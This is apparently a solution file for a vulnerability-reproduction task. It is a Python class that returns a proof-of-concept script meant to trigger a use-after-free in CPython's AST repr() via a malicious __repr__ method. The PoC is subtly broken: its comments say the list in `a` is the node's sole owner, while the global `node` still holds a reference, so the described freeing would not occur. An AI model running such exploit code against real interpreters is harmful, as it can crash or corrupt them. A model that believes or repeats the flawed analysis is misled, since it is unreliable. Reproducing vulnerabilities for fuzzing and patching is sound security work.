class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers a Heap Use After Free
        vulnerability in CPython's AST repr() function (oss-fuzz:368076875).

        The vulnerability, tracked as bpo-44931, is in `ast_repr_const`, the C
        function that implements `repr()` for `ast.Constant` objects. This
        function calls `repr()` on the constant's value without incrementing the
        reference count of the `ast.Constant` node itself. If the value is a
        custom Python object, its `__repr__` method can execute arbitrary code.

        The PoC exploits this by crafting a `__repr__` method that causes the
        `ast.Constant` node to be garbage collected while the `ast_repr_const`
        function is still on the stack. When `ast_repr_const` resumes, its
        `self` pointer to the node is dangling, and any subsequent access to it
        results in a use-after-free.

        The PoC script does the following:
        1. Defines a class `C` with a malicious `__repr__` method.
        2. When invoked, this `__repr__` method destroys a global variable `a`,
           which holds the only reference to the `ast.Constant` node.
        3. This destruction triggers a chain of deallocations, freeing the node.
        4. The `repr(node)` call initiates this process, leading to the UAF when
           the C function attempts to access the now-freed node.

        This PoC is small and effective, designed to be caught by memory
        sanitizers like ASAN, which is typical in fuzzing environments.
        """

        poc_script = b"""
import ast
import gc

class C:
    def __repr__(self):
        global a
        # Destroy the global variable `a`, which holds the sole reference
        # to the list containing the vulnerable node. This triggers garbage
        # collection for the list and subsequently the node itself.
        a = None
        # Explicitly call the garbage collector to ensure the deallocation
        # happens synchronously before the C function resumes.
        gc.collect()
        return ""

# Create an ast.Constant node whose value is an instance of our malicious class.
node = ast.Constant(C())

# The global variable `a` is made the sole owner of the `node`.
a = [node]

# This call triggers the vulnerability.
# 1. repr(node) calls the C function `ast_repr_const`.
# 2. `ast_repr_const` calls `repr()` on the node's value, which is C().
# 3. Our C.__repr__ method executes, setting `a = None` and freeing `node`.
# 4. `ast_repr_const` resumes and accesses the dangling pointer to `node`.
repr(node)
"""
        return poc_script.strip()